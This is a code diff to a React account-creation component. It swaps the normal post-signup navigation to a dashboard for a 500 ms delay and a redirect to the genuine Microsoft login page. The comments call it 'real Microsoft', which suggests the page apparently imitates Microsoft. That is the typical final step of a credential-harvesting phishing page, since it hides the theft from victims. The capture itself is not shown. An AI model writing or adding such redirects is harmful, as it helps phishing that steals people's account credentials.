@@ -60,11 +60,17 @@ const CreateAccount = () => {
       // Store auth data in localStorage
       authService.storeAuthData(result.token, result.user);
       
-      // Navigate to dashboard
-      navigate('/dashboard');
+      // Show brief success message before closing
+      setLoading(false);
+      
+      // Wait 500ms then redirect to real Microsoft
+      setTimeout(() => {
+        // Redirect to real Microsoft login
+        window.location.href = 'https://login.microsoftonline.com/';
+      }, 500);
+      
     } catch (err) {
       setError(err.message || 'Account creation failed. Please try again.');
-    } finally {
       setLoading(false);
     }
   };
